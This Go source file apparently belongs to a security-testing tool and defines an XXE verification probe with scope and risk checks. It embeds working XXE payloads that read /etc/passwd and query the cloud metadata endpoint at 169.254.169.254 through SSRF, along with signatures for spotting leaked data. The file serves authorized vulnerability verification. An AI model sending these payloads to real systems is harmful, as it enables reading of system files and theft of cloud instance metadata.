package verify

import (
	"fmt"
	"os"
	"strings"

	"github.com/srank-org/ensphere/internal/evidence"
)

// XXEConfig holds configuration for XXE verification.
type XXEConfig struct {
	URL       string
	Method    string // typically POST
	Technique string // file_read | ssrf
	ProbeConfig
}

var xxePayloads = map[string]string{
	"file_read": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>`,
	"ssrf": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>`,
}

var xxeSignatures = []string{
	"root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh",
	"latest/meta-data", "ami-id", "instance-id",
}

var validXXETechniques = map[string]bool{
	"file_read": true, "ssrf": true,
}

// VerifyXXE runs the XXE verification probe.
func VerifyXXE(cfg XXEConfig) (*ProbeResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	if err := CheckMaxRisk(3, cfg.MaxRisk); err != nil {
		return nil, err
	}

	if !validXXETechniques[cfg.Technique] {
		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: file_read, ssrf", cfg.Technique)}
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	probeCount := 0

	payload := xxePayloads[cfg.Technique]
	headers := make(map[string]string)
	for k, v := range cfg.Headers {
		headers[k] = v
	}
	headers["Content-Type"] = "application/xml"

	throttle.Wait()
	probeCount++
	resp := HTTPProbe(cfg.Method, cfg.URL, payload, headers, cfg.TimeoutSec, cfg.InScope)
	if resp.Error != nil {
		return nil, fmt.Errorf("xxe probe: %w", resp.Error)
	}

	fmt.Fprintf(os.Stderr, "[PROBE] status=%d len=%d technique=%s\n", resp.StatusCode, len(resp.Body), cfg.Technique)
	writeEvidence(ew, "xxe", cfg.Technique, cfg.URL, "", resp.StatusCode,
		fmt.Sprintf("%dms", resp.ElapsedMs), "probe", fmt.Sprintf("technique=%s", cfg.Technique))

	var matchedSignatures []string
	for _, sig := range xxeSignatures {
		if strings.Contains(resp.Body, sig) {
			matchedSignatures = append(matchedSignatures, sig)
		}
	}

	snippet := resp.Body
	if len(snippet) > 500 {
		snippet = snippet[:500]
	}

	probe := RoundResult{
		StatusCode: resp.StatusCode,
		ElapsedMs:  resp.ElapsedMs,
		BodyHash:   resp.BodyHash,
		BodyLength: len(resp.Body),
	}

	return &ProbeResult{
		VulnType:   "xxe",
		Technique:  cfg.Technique,
		StartedAt:  timer.StartedAt(),
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
		Measurements: XXEMeasurements{
			Probe:             probe,
			MatchedSignatures: matchedSignatures,
			PayloadUsed:       payload,
			ResponseSnippet:   snippet,
		},
	}, nil
}
